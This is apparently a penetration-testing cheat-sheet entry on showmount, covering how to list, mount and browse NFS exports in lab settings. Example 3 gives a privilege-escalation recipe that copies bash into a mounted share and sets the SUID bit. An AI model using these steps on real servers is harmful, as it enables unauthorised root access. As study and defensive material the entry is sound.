## showmount: choose the operation and read the result

List NFS exports when mountd is available.

### What the result establishes

Read advertised NFS exports and allowed clients as leads for a subsequent mount/access check.

### Prerequisites and common failures

NFSv4 behavior and server configuration can limit export listing; an advertised export is not proof this client can mount or read it.

### Example 1: Commands

Run in: **Kali**.

```bash
showmount -e TARGET_IP
```

### Example 2: 1. List the exports

Run in: **Saved lab example**.

```bash
showmount -e <IP>          # -e = list exports; shows each share and its allowed clients
```

### Example 3: NFS Root Squashing

Run in: **Saved lab example**.

```powershell
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash .  

# set suid permission
chmod +s bash
```

### Example 4: NFS (Port 2049)

Run in: **Saved lab example**.

```bash
# List available shares
showmount -e <IP>

# Mount a share
mkdir /tmp/target-NFS
sudo mount -t nfs <IP>:/<share> /tmp/target-NFS

# Browse (use sudo — NFS permissions may block normal user)
sudo ls -la /tmp/target-NFS/<folder>
sudo cat /tmp/target-NFS/<folder>/file.txt

# Unmount when done (important — stale mounts freeze your terminal)
sudo umount -f /tmp/target-NFS
sudo umount -l /tmp/target-NFS   # if -f doesn't work
```
